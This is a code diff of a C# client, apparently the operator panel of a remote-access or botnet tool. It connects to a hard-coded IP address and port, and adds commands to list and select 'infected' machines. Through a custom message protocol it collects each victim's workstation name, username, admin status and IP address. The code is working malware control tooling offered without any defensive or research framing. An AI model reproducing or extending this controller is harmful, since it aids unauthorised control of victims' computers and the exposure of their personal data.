@@ -18,7 +18,7 @@ namespace YTAH_COMMUNITY
         public static TcpClient client;
         public static IPAddress ip = IPAddress.Parse("78.114.52.238");
         public static int port = 5000;
-
+        
         public static void Connect()
         {
             try
@@ -26,6 +26,7 @@ namespace YTAH_COMMUNITY
                 client = new TcpClient();
                 client.Connect(ip, port);
                 Thread thread = new Thread(o => ReceiveData((TcpClient)o));
+                thread.IsBackground = true;
                 thread.Start(client);
                 
               
@@ -37,6 +38,16 @@ namespace YTAH_COMMUNITY
             {
                 Form1.current = Form1.State.DECONNECTE;
             }
+        }
+        public static void GetUsers()
+        {
+            string msg = "GetUsers|" + Perso.Me.username;
+            SendMessage(msg);
+        }
+        public static void SelectUser(string userpost)
+        {
+            byte[] b = Encoding.ASCII.GetBytes("SelectUser|" + Perso.Me.username + "|" + userpost);
+            ns.Write(b, 0, b.Length);
         }
         public static void SendMessage(string msg)
         {
@@ -76,11 +87,76 @@ namespace YTAH_COMMUNITY
                     {
                         MessageBox.Show("Tu t'es trompé / tu ne fait pas partit de l'élite, navré poto");
                     }
-                    if (d.Contains("adminconnect"))
+                    if (d.Contains("LOG"))
                     {
-                        string username = splitter[1];
-                        MessageDisplayer.AdminConnect(username);
+                        string logid = splitter[1];
+                        string msg = splitter[2];
+                        string secmsg = "";
+                        try
+                        {
+                            secmsg = splitter[3];
+                        }
+                        catch
+                        {
+
+                        }
+                        switch (logid)
+                        {
+                            case "adminconnect":
+                                MessageDisplayer.AdminConnect(msg);
+                                break;
+                            case "SelectSuccess":
+                                MessageDisplayer.SelectBool(true, msg, secmsg);
+                                break;
+                            case "SelectFailed":
+                                MessageDisplayer.SelectBool(false, msg, secmsg);
+                                break;
+                        }
                     }
+                    if (d.Contains("empty"))
+                    {
+                        MessageDisplayer.Log("Aucun infecté !");
+                    }
+                    if (d.Contains("USERS"))
+                    {
+                        string[] global =  d.Split(';'); //USERS;dzqd|qdoqzd|zqdpqokz|qzqzdp;
+                        string reqid = global[0];
+                        MessageDisplayer.LoadUsers();
+                        foreach (string s in global)
+                        {
+                            if (!s.Contains("USERS"))
+                            {
+                               
+                                if (s == "")
+                                {
+
+                                }
+                                else
+                                {
+                                    try
+                                    {
+                                        string[] split = s.Split('|');
+                                        string poste = split[0];
+                                        string user = split[1];
+                                        string isadmin = split[2];
+                                        string ip = split[3];
+                                        User u = new User(user, poste, isadmin, ip);
+                                        if (!User.users.Contains(u))
+                                        {
+                                            User.users.Add(u);
+                                        }
+                                    }
+                                    catch
+                                    {
+
+                                    }
+                                }
+                            }
+                            
+                        }
+                        MessageDisplayer.UsersLoaded();
+                    }
+                 
                 }
             }
             catch
